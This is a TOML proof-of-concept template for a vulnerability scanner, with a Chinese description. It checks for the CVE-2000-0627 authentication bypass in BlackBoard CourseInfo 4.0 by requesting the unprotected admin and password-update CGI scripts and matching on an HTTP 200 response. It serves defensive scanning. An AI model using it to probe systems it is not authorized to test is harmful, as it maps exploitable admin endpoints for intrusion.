[info]
author = "AVE"
description = "检测 BlackBoard CourseInfo 4.0 未授权访问 CGI 程序漏洞，通过直接请求 user_update_admin.pl 和 user_update_passwd.pl 验证是否存在认证绕过"
id = "POC-AVE-2000-0757"
name = "BlackBoard CourseInfo 认证绕过 PoC"
severity = "high"
tags = [
    "cve-2000-0627",
    "blackboard",
    "auth-bypass",
]
vuln_id = [
    "CVE-2000-0627",
    "AVE-2000-0757",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/user_update_admin.pl"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/user_update_passwd.pl"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
